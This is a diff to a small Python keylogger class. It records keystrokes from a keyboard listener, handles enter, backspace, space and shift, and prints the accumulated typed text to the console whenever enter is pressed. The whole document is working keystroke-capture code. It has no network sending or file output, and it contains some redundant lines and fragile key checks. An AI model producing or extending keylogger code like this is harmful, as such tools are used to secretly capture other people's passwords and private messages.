@@ -5,19 +5,29 @@ class SimpleKeylogger:
 		self.logger = ""
 	
 	def append_to_log(self,key_strike):
+		
 		self.logger = self.logger + key_strike
 		self.logger = self.logger
 	
-		print(self.logger)
 
 	def evaluate_keys(self, key):
 		try:
-			Pressed_key = (str.char)
+			Pressed_key = str(key.char)
 		except AttributeError:
-			if key == key_space:
+			Pressed_key = ""
+
+			if key == key.enter:
+				print(self.logger)
+				self.logger = ""
+			elif key == key.backspace:
+				self.logger = self.logger[0:len(self.logger)-1]
+			elif key == key.space:
 				Pressed_key = ""
+				self.logger = self.logger  + " "
+			elif key == key.shift:
+				test = 'pass'
 			else:
-				Pressed_key = "" + str(key) + ""
+				Pressed_key = "[" + str(key) + "] "
 			
 		self.append_to_log(Pressed_key)
 
@@ -26,6 +36,7 @@ class SimpleKeylogger:
 		with keyboard_listener:
 			self.logger = ""
 			keyboard_listener.join()
+		
 
 
 SimpleKeylogger().run()
